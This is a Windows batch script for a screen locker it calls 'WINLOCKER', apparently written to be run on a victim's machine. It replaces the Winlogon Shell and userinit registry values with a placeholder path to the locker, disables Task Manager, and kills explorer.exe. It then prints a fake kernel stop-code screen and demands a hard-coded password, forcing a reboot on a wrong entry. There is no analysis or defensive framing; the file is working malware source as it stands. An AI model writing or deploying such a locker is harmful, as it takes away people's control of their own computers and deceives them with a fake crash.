@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /t REG_SZ /d "ПУТЬ К ВИНЛОКЕРУ" /f
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
Taskkill/f /im explorer.exe
Title WINLOCKER
color 2


echo The computer is blocked!
echo Der Computer ist gesperrt!

echo *** STOP: 0x1000007e 
echo (0xffffffffc0000005, 
echo 0xfffff80002e55151, 
echo 0xfffff880009a99d8,
echo 0xfffff880009a9230)
echo *** xNtKrnl.exe - Address 
echo 0xfffff80002e55151 base at echo 0xfffff80002e0d000 DateStamp
echo 0x4ce7951a
echo Enter password

:h
set/p x=
if %x%==fkwegkergkepgkwergekgermgrmgkejmgkgjmkrtgjmkgjetkgjmegkljmwog (echo win start
start explorer
exit
) else (
echo Your sistem was be removed!
shutdown /r
)
goto h